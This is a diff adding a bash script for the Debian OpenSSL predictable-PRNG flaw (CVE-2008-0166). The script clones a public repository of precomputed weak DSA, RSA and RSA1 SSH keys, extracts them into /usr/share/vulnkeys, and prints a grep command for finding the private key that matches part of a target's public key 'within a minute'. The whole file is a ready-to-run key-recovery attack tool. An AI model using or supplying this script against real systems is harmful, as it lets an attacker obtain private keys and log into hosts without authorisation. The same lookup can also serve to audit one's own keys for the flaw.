@@ -1,0 +1,59 @@
+#!/usr/bin/env bash
+# Ugly script for Debian OpenSSL Predictable PRNG (CVE-2008-0166).
+# Downloads vulnerable keys from g0tmi1k to $DESTINATION.
+# Define DESTINATION and run:
+# ./get_vulnkeys
+# when done run (where xxx is part of the public key):
+# find /usr/share/vulnkeys -type f -print0 | LC_ALL=C xargs -r0 -P2 grep -i "xxx"
+# avarx 31.12.2018
+
+DESTINATION='/usr/share/vulnkeys'
+_make_directory(){
+  if [ ! -d "$DESTINATION" ]; then
+    mkdir $DESTINATION
+  fi
+}
+
+_clone_repository() {
+  git clone -q https://github.com/g0tmi1k/debian-ssh.git /tmp/debian-ssh
+}
+
+_extract_common_keys(){
+  tar -xjf /tmp/debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+  tar -xjf /tmp/debian-ssh/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
+}
+
+_extract_uncommon_keys(){
+  cat /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa1_x86.tar.* > /tmp/debian-ssh/uncommon_keys/rsa1.zip
+  unzip -q /tmp/debian-ssh/uncommon_keys/rsa1.zip 2>/dev/null
+  tar -xjf debian_ssh_rsa1_x86.tar.bz
+  tar -xjf /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa_1023_x86.tar.bz2
+  tar -xjf /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa_1024_x86.tar.bz2
+  tar -xjf /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa_2047_x86.tar.bz2
+  tar -xjf /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa_4096_x86.tar.bz2
+  tar -xjf /tmp/debian-ssh/uncommon_keys/debian_ssh_rsa_8192_1_4100_x86.tar.bz2
+}
+
+_move_keys(){
+  mv dsa $DESTINATION
+  mv rsa $DESTINATION
+  mv rsa1 $DESTINATION
+}
+
+_main() {
+  _make_directory
+  echo '[*] Cloning repository from g0tm1lk...'
+  _clone_repository
+  echo '[*] Extracting common keys. This will take a while...'
+  _extract_common_keys
+  echo '[*] Extracting uncommon keys. This will take a while...'
+  _extract_uncommon_keys
+  echo '[*] Moving keys to final location...'
+  _move_keys
+  echo '[*] Keys are stored in '$DESTINATION
+  echo '[*] Now run: find '$DESTINATION '-type f -print0 | LC_ALL=C xargs -r0 -P2 grep -i "xxx"'
+  echo '[*] Where xxx is part of the public key.'
+  echo '[*] This should return a matching key within a minute.'
+}
+
+_main
